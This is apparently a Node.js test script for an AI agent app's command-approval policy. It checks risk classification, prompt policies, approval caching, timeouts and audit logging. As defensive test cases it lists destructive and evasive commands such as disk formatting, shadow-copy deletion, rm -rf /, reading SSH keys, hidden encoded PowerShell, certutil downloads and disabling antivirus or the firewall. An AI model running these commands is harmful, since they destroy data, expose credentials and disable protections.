"use strict";

/**
 * 审批边界自检（不需要模型，纯离线）。
 *   node scripts/verify-approval.js
 *
 * 覆盖：
 * 1. 风险分类是否正确（只读 / 写 / 删除 / 联网 / 凭据 / 系统 / 永久拒绝）
 * 2. 四种策略下「该不该问」
 * 3. 审批状态机：允许一次 / 本次运行 / 本会话 / 拒绝 / 超时 / 无人值守 / 取消
 * 4. 审计记录是否落盘
 */

const path = require("node:path");
const fs = require("node:fs");
const os = require("node:os");

const root = path.resolve(__dirname, "..");
const { classifyTool, shouldAsk } = require(path.join(root, "app/src/main/approval/policy"));
const { ApprovalManager } = require(path.join(root, "app/src/main/approval/approval-manager"));
const { AuditLog } = require(path.join(root, "app/src/main/approval/audit"));

let pass = 0;
let fail = 0;

function check(name, actual, expected) {
  const ok = JSON.stringify(actual) === JSON.stringify(expected);
  if (ok) {
    pass++;
    console.log(`  ✓ ${name}`);
  } else {
    fail++;
    console.log(`  ✗ ${name}\n      期望 ${JSON.stringify(expected)}\n      实际 ${JSON.stringify(actual)}`);
  }
}

console.log("\n[1] 风险分类");
const cases = [
  ["list_files", { path: "." }, "safe"],
  ["read_file", { path: "a.txt" }, "safe"],
  ["search_text", { pattern: "x" }, "safe"],
  ["list_bots", {}, "safe"],
  ["write_file", { path: "a.txt", content: "hi" }, "write"],
  ["run_command", { command: "Get-ChildItem" }, "read"],
  ["run_command", { command: "Get-Content .\\a.txt" }, "read"],
  ["run_command", { command: "git status" }, "read"],
  ["run_command", { command: "npm ls" }, "read"],
  ["run_command", { command: "git log -n 5" }, "read"],
  ["run_command", { command: "git commit -m x" }, "exec"],
  ["run_command", { command: "npm test" }, "exec"],
  ["run_command", { command: "npm run build" }, "exec"],
  ["run_command", { command: "python train.py" }, "exec"],
  ["run_command", { command: "node build.js" }, "exec"],
  ["run_command", { command: "foo.exe --whatever" }, "exec"],
  ["run_command", { command: "Get-ChildItem; Remove-Item x" }, "delete"],
  ["run_command", { command: "Remove-Item .\\a.txt" }, "delete"],
  ["run_command", { command: "git clean -fd" }, "delete"],
  ["run_command", { command: "npm install left-pad" }, "network"],
  ["run_command", { command: "git push origin main" }, "network"],
  ["run_command", { command: "curl -X POST https://x.dev -d @a.json" }, "network"],
  ["run_command", { command: "Get-Content $env:APPDATA\\..\\.ssh\\id_rsa" }, "secret"],
  ["run_command", { command: "Set-ExecutionPolicy Bypass -Scope Process" }, "system"],
  ["run_command", { command: "taskkill /f /im node.exe" }, "system"],
  ["run_command", { command: "node -e \"console.log(1)\"" }, "script"],
  ["run_command", { command: "powershell -EncodedCommand ZQBjAGgAbwA=" }, "script"],
  ["run_command", { command: "echo hi > note.txt" }, "write"],
  ["delegate_to_bot", { botName: "文档官", task: "写周报" }, "collab"],
  ["message_bot", { botName: "撰稿人", message: "在吗" }, "collab"],
  ["start_group_chat", { topic: "选型", members: ["a", "b"] }, "collab"],
  ["mcp__calc__add", { a: 1 }, "mcp"],
  ["forget", { id: "m1" }, "memory"],
];
for (const [tool, args, want] of cases) {
  check(`${tool} → ${want}`, classifyTool(tool, args).category, want);
}

console.log("\n[2] 永久拒绝");
for (const cmd of [
  "Format-Volume -DriveLetter D",
  "diskpart",
  "bcdedit /set test",
  "vssadmin delete shadows /all",
  "Remove-Item C:\\Windows -Recurse -Force",
  "del C:\\",
  "reg delete HKLM\\Software\\Foo /f",
]) {
  const r = classifyTool("run_command", { command: cmd });
  check(`拒绝 ${cmd}`, r.blocked === true, true);
}

console.log("\n[3] 策略矩阵（要问吗）");
const policy = [
  ["strict", "write", true],
  ["strict", "exec", true],
  ["strict", "read", true],
  ["strict", "mcp", true],
  ["balanced", "write", false],
  ["balanced", "exec", true],
  ["balanced", "read", false],
  ["balanced", "delete", true],
  ["balanced", "network", true],
  ["balanced", "collab", true],
  ["balanced", "mcp", true],
  ["relaxed", "collab", false],
  ["relaxed", "delete", true],
  ["relaxed", "secret", true],
  ["off", "delete", false],
  ["off", "system", false],
];
for (const [mode, cat, want] of policy) check(`${mode} + ${cat}`, shouldAsk(mode, cat), want);

/** 造一个 manager，自动应答界面事件 */
function makeManager(mode = "balanced", answer = null, { timeoutMs = 200 } = {}) {
  const events = [];
  const mgr = new ApprovalManager({
    getGlobalMode: () => mode,
    timeoutMs,
    send: (ev) => {
      events.push(ev);
      if (ev.type === "approval_request" && answer) {
        setTimeout(() => answer(mgr, ev.request), 5);
      }
    },
  });
  return { mgr, events };
}

const base = {
  runId: "run-1",
  sessionId: "s-1",
  botId: "b-1",
  botName: "代码助手",
};

async function main() {
  // 审批超时定时器是 unref 的（Electron 常驻无所谓），测试里需要自己保活
  const keepAlive = setInterval(() => {}, 1000);
  console.log("\n[4] 审批状态机");

  {
    console.log(" · 只读直接放行");
    const { mgr } = makeManager();
    const r = await mgr.ask({ ...base, tool: "read_file", args: { path: "a.txt" } });
    check("read_file 放行", r.allowed, true);
    check("来源 policy", r.decidedBy, "policy");
  }

  {
    console.log(" · 允许一次");
    let asks = 0;
    const { mgr } = makeManager("balanced", (m, req) => {
      asks++;
      m.resolve(req.id, "allow", "once");
    });
    const r1 = await mgr.ask({ ...base, tool: "run_command", args: { command: "Remove-Item x.txt" } });
    const r2 = await mgr.ask({ ...base, tool: "run_command", args: { command: "Remove-Item x.txt" } });
    check("第一次放行", r1.allowed, true);
    check("第二次仍要问（once 只生效一次）", asks, 2);
    check("第二次也放行", r2.allowed, true);
  }

  {
    console.log(" · 本次运行都允许（同类不再问）");
    let asks = 0;
    const { mgr } = makeManager("balanced", (m, req) => {
      asks++;
      m.resolve(req.id, "allow", "run");
    });
    await mgr.ask({ ...base, tool: "run_command", args: { command: "Remove-Item a.txt" } });
    const r = await mgr.ask({ ...base, tool: "run_command", args: { command: "Remove-Item b.txt" } });
    check("只弹一次", asks, 1);
    check("第二次按运行级放行", r.decidedBy, "run-allow");
  }

  {
    console.log(" · 本会话都允许（跨运行生效）");
    let asks = 0;
    const { mgr } = makeManager("balanced", (m, req) => {
      asks++;
      m.resolve(req.id, "allow", "session");
    });
    await mgr.ask({ ...base, runId: "run-A", tool: "run_command", args: { command: "npm install x" } });
    const r = await mgr.ask({ ...base, runId: "run-B", tool: "run_command", args: { command: "npm install y" } });
    check("只弹一次", asks, 1);
    check("第二次按会话级放行", r.decidedBy, "session-allow");
  }

  {
    console.log(" · 拒绝后不执行，且同写法不重复弹");
    let asks = 0;
    const { mgr } = makeManager("balanced", (m, req) => {
      asks++;
      m.resolve(req.id, "deny", "once");
    });
    const r1 = await mgr.ask({ ...base, tool: "run_command", args: { command: "taskkill /f /im node.exe" } });
    const r2 = await mgr.ask({ ...base, tool: "run_command", args: { command: "taskkill /f /im node.exe" } });
    check("第一次被拒", r1.allowed, false);
    check("第二次走缓存拒绝", r2.decidedBy, "cached-deny");
    check("只弹一次", asks, 1);
  }

  {
    console.log(" · 超时自动拒绝");
    const { mgr } = makeManager("balanced", null, { timeoutMs: 60 });
    const r = await mgr.ask({ ...base, tool: "run_command", args: { command: "Remove-Item x" } });
    check("超时拒绝", r.allowed, false);
    check("来源 timeout", r.decidedBy, "timeout");
  }

  {
    console.log(" · 无人值守（例程默认）");
    const { mgr } = makeManager();
    const r = await mgr.ask({
      ...base, tool: "run_command", args: { command: "Remove-Item x" }, unattended: true,
    });
    check("拒绝", r.allowed, false);
    check("来源 unattended", r.decidedBy, "unattended");

    const r2 = await mgr.ask({
      ...base, tool: "run_command", args: { command: "Remove-Item x" }, unattended: true, autoApprove: true,
    });
    check("例程显式允许则放行", r2.allowed, true);
  }

  {
    console.log(" · 永久拒绝：不弹窗，不可放行");
    let asks = 0;
    const { mgr, events } = makeManager("off", () => asks++);
    const r = await mgr.ask({ ...base, tool: "run_command", args: { command: "diskpart" } });
    check("仍被拦", r.allowed, false);
    check("标记 blocked", r.blocked, true);
    check("没有弹审批", events.filter((e) => e.type === "approval_request").length, 0);
    check("没有调用应答", asks, 0);
  }

  {
    console.log(" · 停止任务时挂起的审批被拒绝");
    let released = false;
    const { mgr } = makeManager("balanced", null, { timeoutMs: 10000 });
    const p = mgr.ask({ ...base, tool: "run_command", args: { command: "Remove-Item x" } });
    await new Promise((r) => setTimeout(r, 30));
    check("挂起 1 个", mgr.pendingFor("run-1").length, 1);
    mgr.cancelRun("run-1");
    const r = await p;
    released = true;
    check("Promise 被兑现", released, true);
    check("结果为拒绝", r.allowed, false);
    check("来源 aborted", r.decidedBy, "aborted");
    check("队列清空", mgr.pendingFor("run-1").length, 0);
  }

  {
    console.log(" · 参数变化会重新问");
    let asks = 0;
    const { mgr } = makeManager("balanced", (m, req) => {
      asks++;
      m.resolve(req.id, "allow", "once");
    });
    await mgr.ask({ ...base, tool: "run_command", args: { command: "npm install a" } });
    await mgr.ask({ ...base, tool: "run_command", args: { command: "npm install b" } });
    check("弹两次", asks, 2);
  }

  console.log("\n[5] 防绕过（新增回归）");
  {
    // 注册表里的每个内置工具都必须有明确的风险归类，不能落到 unknown
    {
      const { BUILTIN_TOOLS } = require(path.join(root, "app/src/main/tools/registry"));
      const unclassified = BUILTIN_TOOLS.map((t) => t.name).filter(
        (name) => classifyTool(name, {}).category === "unknown",
      );
      check("所有内置工具都已归类", unclassified, []);
      check("内置工具数量", BUILTIN_TOOLS.length, 23);
    }

    // 清空运行记忆：不能把上一轮的「已拒绝」带到下一轮
    {
      let askCount = 0;
      const { mgr } = makeManager("balanced", (m, req) => {
        askCount++;
        m.resolve(req.id, "deny", "once");
      });
      const a1 = await mgr.ask({ ...base, tool: "run_command", args: { command: "Remove-Item x" } });
      const a2 = await mgr.ask({ ...base, tool: "run_command", args: { command: "Remove-Item x" } });
      check("第一次被拒", a1.allowed, false);
      check("同运行内走缓存拒绝", a2.decidedBy, "cached-deny");
      check("缓存期间只问一次", askCount, 1);
      mgr.forgetRun("run-1");
      const a3 = await mgr.ask({ ...base, tool: "run_command", args: { command: "Remove-Item x" } });
      check("forgetRun 后重新问", askCount, 2);
      check("重新问的结果仍是拒绝", a3.allowed, false);
    }

    // 未登记工具不能默认放行
    check("未知工具 → unknown", classifyTool("some_future_tool", { a: 1 }).category, "unknown");
    check("unknown 在 balanced 下要问", shouldAsk("balanced", "unknown"), true);
    check("unknown 在 off 下不问", shouldAsk("off", "unknown"), false);

    // 读凭据：文件工具也要问
    for (const p of [".env", "credentials.json", ".ssh/id_rsa", "sub/.aws/credentials"]) {
      check(`read_file ${p} → secret`, classifyTool("read_file", { path: p }).category, "secret");
    }
    check("普通源码仍 safe", classifyTool("read_file", { path: "src/index.js" }).category, "safe");
    check("搜 .ssh → secret", classifyTool("search_text", { pattern: "x", path: ".ssh" }).category, "secret");
    check("写 .env → secret", classifyTool("write_file", { path: ".env", content: "A=1" }).category, "secret");

    // 技能/截图是 Bot 自己该读的（新加只读白名单后不能误判成 secret，否则会一直弹窗）
    const appData = "C:\\Users\\u\\AppData\\Roaming\\Grok Bot\\";
    check("读技能目录 → safe", classifyTool("read_file", { path: appData + "skills\\x\\SKILL.md" }).category, "safe");
    check("列技能目录 → safe", classifyTool("list_files", { path: appData + "skills\\x" }).category, "safe");
    check("读截图 → safe", classifyTool("read_file", { path: appData + "screenshots\\a.png" }).category, "safe");
    // 但应用自身配置/凭据仍要问
    check("读 app.json → secret", classifyTool("read_file", { path: appData + "app.json" }).category, "secret");
    check("读 mcp.json → secret", classifyTool("read_file", { path: appData + "mcp.json" }).category, "secret");

    // 浏览器出站要走网络档
    check("browser_navigate → network", classifyTool("browser_navigate", { url: "https://x.dev" }).category, "network");

    // 记忆：profile 层是提示注入落点，要问；log 层不问
    check("remember profile → memory", classifyTool("remember", { topic: "t", content: "c", tier: "profile" }).category, "memory");
    check("remember log → safe", classifyTool("remember", { topic: "t", content: "c", tier: "log" }).category, "safe");

    // 永久拒绝补漏
    for (const cmd of [
      "Remove-Item C:\\ -Recurse -Force",
      "rm -rf --no-preserve-root /",
      "cmd /c rd /s /q C:\\Windows",
      "Remove-Item C:\\Users -Recurse -Force",
    ]) {
      check(`永久拒绝 ${cmd}`, classifyTool("run_command", { command: cmd }).blocked, true);
    }

    // 合法项目目录不能被误伤
    for (const cmd of [
      "Remove-Item .\\dist -Recurse -Force",
      "Remove-Item C:\\Users\\me\\proj\\node_modules -Recurse -Force",
      "git clean -fd",
    ]) {
      check(`不误伤 ${cmd}`, classifyTool("run_command", { command: cmd }).blocked, false);
    }

    // 短写编码参数 / 合法工具滥用
    check("powershell -enc → script", classifyTool("run_command", { command: "powershell -nop -w hidden -enc ZQBjAGgAbwA=" }).category, "script");
    check("certutil 下载 → network", classifyTool("run_command", { command: "certutil -urlcache -f http://x/a.exe a.exe" }).category, "network");
    check("关杀软 → system", classifyTool("run_command", { command: "Set-MpPreference -DisableRealtimeMonitoring $true" }).category, "system");
    check("防火墙 off → system", classifyTool("run_command", { command: "netsh advfirewall set allprofiles state off" }).category, "system");
  }

  console.log("\n[6] 审计落盘");
  {
    const dir = path.join(os.tmpdir(), "verify-approval-" + Date.now());
    fs.mkdirSync(dir, { recursive: true });
    const log = new AuditLog(dir);
    log.record({ tool: "run_command", args: { command: "npm install x" }, category: "network", decision: "denied", botName: "A" });
    log.record({ tool: "run_command", args: { command: "Remove-Item x" }, category: "delete", decision: "allowed", botName: "A" });
    check("文件存在", fs.existsSync(log.file), true);
    check("读取 2 条", log.recent().length, 2);
    check("最新在前", log.recent()[0].category, "delete");
    check("统计", log.stats(), { total: 2, denied: 1, allowed: 1 });
    check("摘要不含文件内容", log.recent()[1].summary, "npm install x");

    const log2 = new AuditLog(dir);
    check("重启后能读回", log2.recent().length, 2);
    fs.rmSync(dir, { recursive: true, force: true });
  }

  clearInterval(keepAlive);
  console.log(`\n${fail === 0 ? "✓ 全部通过" : "✗ 有失败"}：${pass} 通过 / ${fail} 失败\n`);
  process.exit(fail === 0 ? 0 : 1);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
